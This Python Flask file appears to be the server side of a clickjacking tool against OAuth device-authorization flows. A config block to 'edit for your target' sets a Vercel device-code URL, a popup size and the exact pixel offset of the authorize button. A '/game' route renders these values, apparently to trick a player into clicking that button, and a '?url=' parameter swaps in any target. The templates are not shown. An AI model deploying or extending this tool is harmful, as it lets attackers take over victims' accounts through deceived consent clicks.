#!/usr/bin/env python3
"""Flask app — local dev server *and* Vercel serverless handler."""

from flask import Flask, redirect, render_template, url_for, request
import os

# ---------------------------------------------------------------------------
# Configuration — edit these for your target
# ---------------------------------------------------------------------------

# Fallback device-authorization URL (used when no ?url= param is provided)
TARGET_URL = "https://vercel.com/oauth/device?user_code=DRMH-DHSK"

POPUP_SIZE = [561, 560]                        # [width, height] of the popup
BUTTON_OFFSET = {"pos": [224, 432], "size": [81, 48]}  # button position & size
USE_HISTORY_BACK = False                      # False = reload URL; True = history.back()

# ---------------------------------------------------------------------------

app = Flask(__name__)
app.secret_key = os.urandom(24)

button = BUTTON_OFFSET


def get_target_url():
    """Return the OAuth URL from query param or fall back to TARGET_URL."""
    return request.args.get("url", TARGET_URL)


@app.route("/")
def index():
    domain = request.host.split(":")[0]
    target_url = get_target_url()
    return render_template("index.html", domain=domain, target_url=target_url)


@app.route("/game")
def game():
    target_url = get_target_url()
    return render_template(
        "game.html",
        url=target_url,
        button=button,
        popup_size=POPUP_SIZE,
        use_history_back=USE_HISTORY_BACK,
    )


@app.route("/clear")
def clear():
    return redirect(url_for("index"))


@app.route("/api/url")
def api_url():
    """Convenience endpoint: redirect to /?url=<param>"""
    target = request.args.get("url", "")
    if target:
        return redirect(url_for("index", url=target))
    return {"error": "missing ?url= param"}, 400


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=8000)
